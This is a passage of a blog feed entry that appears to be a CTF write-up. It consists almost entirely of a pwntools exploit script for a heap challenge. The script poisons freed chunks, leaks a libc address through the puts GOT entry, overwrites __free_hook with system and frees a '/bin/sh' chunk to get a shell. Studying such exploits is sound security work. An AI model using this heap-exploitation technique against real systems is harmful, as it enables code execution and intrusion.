function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">size,char,weight</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">        io.sendline(char)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Add_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log: &quot;</span>)</span><br><span class="line">    io.sendline(log)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Delete_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Print_log&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Init_much</span>(<span class="params">size,char,weight,char2,weight2</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;log@code:/root/ $ &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Init&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;char: &quot;</span>)</span><br><span class="line">    io.sendline(char2)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;weight: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(weight2))</span><br><span class="line">Init(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>-<span class="number">0x2</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0x405230</span>)</span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(puts_got))<span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = cyclic(<span class="number">0xe</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(free_hook)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401AE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">Init_much(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,payload,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
</feed>
